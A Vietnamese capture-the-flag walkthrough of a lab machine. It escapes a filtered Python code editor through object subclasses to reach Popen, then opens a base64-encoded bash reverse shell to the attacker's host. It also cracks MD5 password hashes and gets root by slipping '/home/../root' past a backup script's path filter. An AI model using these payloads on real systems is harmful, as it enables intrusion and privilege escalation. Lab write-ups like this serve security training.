# Code

<img width="1103" height="801" alt="image" src="https://github.com/user-attachments/assets/5d17bf7c-09f7-44de-b35c-688df8383327" />

Đầu tiên thì đề cho cái địa chỉ ip là `10.10.11.62`, tôi sử dụng nmap để quét các port đang mở tại địa chỉ ip đó:
```
nmap -sV -p- -T5 10.10.11.62
```
Sau 1 lúc scan thì ra được 2 port gồm port 5000 và 20 trong đó 5000 là http và 20 là ssh:

<img width="993" height="302" alt="image" src="https://github.com/user-attachments/assets/7bf48765-b0ee-4687-b86f-cd766e3ddcbb" />

Sau khi truy cập vào thì thấy website là `Python Code Editor` với bên dưới là code python:

<img width="1804" height="1014" alt="image" src="https://github.com/user-attachments/assets/0c20915c-327e-4940-84b5-6c3d6fc64476" />

Khi sử dụng các từ khóa liên quan đến hệ thống như os, popen,... thì sẽ hiện ra dòng `Use of restricted keywords is not allowed.`

<img width="1524" height="222" alt="image" src="https://github.com/user-attachments/assets/323a7237-1fba-44f7-a953-26b9c6f30e81" />

<img width="1531" height="200" alt="image" src="https://github.com/user-attachments/assets/e37845f2-e0b3-40c7-ae93-7c0bbddd1294" />

Phần đăng nhập và đăng kí có vẻ không có lỗi gì, fuzzing cũng không có gì đặc biệt nên tôi nghĩ là ssti

Tôi sử dụng đoạn script này để tìm class `popen` có trong đó không mà không dùng đến import 
```
i=0

for c in [].__class__.__base__.__subclasses__():
    if c.__name__.lower() == 'pop'+'en':
        print(f"{i}-"+c.__name__)
    i+=1
```
<img width="1187" height="238" alt="image" src="https://github.com/user-attachments/assets/6deb46a6-10a7-4c65-96bd-36b6b9f3fff9" />

Khi tôi sử dụng `[].__class__.__base__.__subclasses__()[317](['pwd'])` thì không thấy trả về kết quả gì cả:

<img width="1166" height="483" alt="image" src="https://github.com/user-attachments/assets/f47975e1-ddfd-48b3-a25f-021183af30b7" />

Khả năng là nó chạy được nhưng không hiện ra, tôi thử làm cái reverse shell:

```
[].__class__.__base__.__subclasses__()[238](['bash','-c','echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTUvMTIzNCAwPiYx | base64 -d | bash'])
```

<img width="856" height="436" alt="image" src="https://github.com/user-attachments/assets/6841c0a9-595f-40eb-b107-e5a24c1cd2ba" />

Và đã đọc được nội dung của flag `user.txt`, trong quá trình khám phá thì có tìm được file `database.sql` sử dụng sqlite3:

<img width="980" height="571" alt="image" src="https://github.com/user-attachments/assets/74db89a2-bd2d-40aa-b696-b4b9fecb0adc" />

Sử dụng `sqlite3 database.db .dump` là ra các thông tin của file:

<img width="789" height="530" alt="image" src="https://github.com/user-attachments/assets/8a7cc35f-05e4-479d-94cc-85ba36df7f5f" />

Và kiếm được 2 cái password được hash của 2 user, có vẻ là md5

Tôi truy cập vào [crack station](https://crackstation.net/) để crack password và ra được 2 cái

<img width="1085" height="509" alt="image" src="https://github.com/user-attachments/assets/81202117-0489-495e-b9d5-677ee0514e88" />

Check file `/etc/passwd` thì ra được user `martin` là có `/bin/bash`

<img width="685" height="92" alt="image" src="https://github.com/user-attachments/assets/125e168a-57f0-431f-aa60-196bab1a9356" />

Tôi tiếp tục ssh vào server với cred của `martin` 

```
ssh martin@10.10.11.62
```
Sử dụng `sudo -l` thì thấy file `/usr/bin/backy.sh` chạy không cần password

<img width="1224" height="326" alt="image" src="https://github.com/user-attachments/assets/dc9367e0-78c3-4867-b3c2-7c39fcd9c701" />


Nội dung của file như sau:

```
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```

Có vẻ nó có chức năng là backup lại dữ liệu trong folder thông qua file json, bắt buộc nằm trong `/var/` và `/home/`, loại bỏ dấu `../` để tránh path traversal, nhưng mà không có đệ quy nên 
có thể bypass được qua

Tiếp theo thì là nội dung của file task.json:

```
{
	"destination": "/home/martin/backups/",
	"multiprocessing": true,
	"verbose_log": false,
	"directories_to_archive": [
		"/home/app-production/app"
	],

	"exclude": [
		".*"
	]
}
```

Ý tưởng là backup lại dữ liệu của `/root/` và đây là đoạn task.json khi được sửa lại

```
{
  "destination": "/tmp/a",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/home/../root"
  ]
}
```
Tôi chỉnh `verbose_log` thành true và xóa `exclude` đi để nó backup toàn bộ các file, sau đó lưu vào `/tmp/a/`

Và sau khi chạy lệnh `sudo /usr/bin/backy.sh t.json`

<img width="912" height="815" alt="image" src="https://github.com/user-attachments/assets/c7a89ade-2243-4d1f-9678-ccd84a583fb2" />

Và xuất hiện 1 file tar trong thư mục, giải nén ra được `/root/` 

<img width="829" height="783" alt="image" src="https://github.com/user-attachments/assets/1b600f8e-b358-49e3-a88f-688e85b2d883" />

Lúc này có thể đọc luôn file `root.txt` luôn cũng được:

<img width="879" height="527" alt="image" src="https://github.com/user-attachments/assets/08a58423-c8f1-4f1d-98b2-f5ea59bcc7c4" />

Hoặc có thể lấy key ssh để ssh vào với quyền root 

<img width="800" height="370" alt="image" src="https://github.com/user-attachments/assets/9063186a-7927-4d37-897a-171725d6dba8" />

<img width="1515" height="882" alt="image" src="https://github.com/user-attachments/assets/3ac01864-ab20-41ae-8162-0a08b11eb360" />
